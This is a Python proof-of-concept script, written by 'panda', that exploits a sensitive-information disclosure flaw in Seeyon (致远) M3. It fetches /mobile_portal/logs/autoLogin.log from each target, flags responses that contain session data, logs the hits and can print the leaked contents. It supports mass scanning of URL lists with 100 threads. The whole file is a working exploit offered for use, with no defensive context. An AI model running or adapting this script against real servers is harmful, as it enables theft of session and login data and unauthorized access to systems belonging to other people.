import sys,argparse,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """

██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║███████║
██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
                      author:panda
                      type:致远M3敏感信息泄露漏洞
                      date:2024-09-2
                      version:1.0
   """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="致远M3敏感信息泄露漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/mobile_portal/logs/autoLogin.log"
    headers = {
        "User-Agent": "Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2227.0Safari/537.36",
        "Accept-Charset": "utf-8",
        "Accept-Encoding": "gzip,deflate",
        "Connection": "close"
    }
    res1 = requests.get(url=target,verify=False,timeout=5)
    if res1.status_code == 200:
        res2 = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
        if "Session" in res2.text:
            with open("result.txt","a",encoding='utf-8') as f:
                f.write(f"该网站[+]{target}存在敏感信息泄露\n")
            print(f"该网站[+]{target}存在敏感信息泄露")
            num = input("输入1查看敏感信息,0退出\n>>>>>>>>>>>>")
            if num == "1":
                print(res2.text)
            else:
                exit()
        else:
            print(f"该网站[+]{target}不存在敏感信息泄露")
    else:
        print("连接超时，请重试!!")
if __name__ == '__main__':
    main()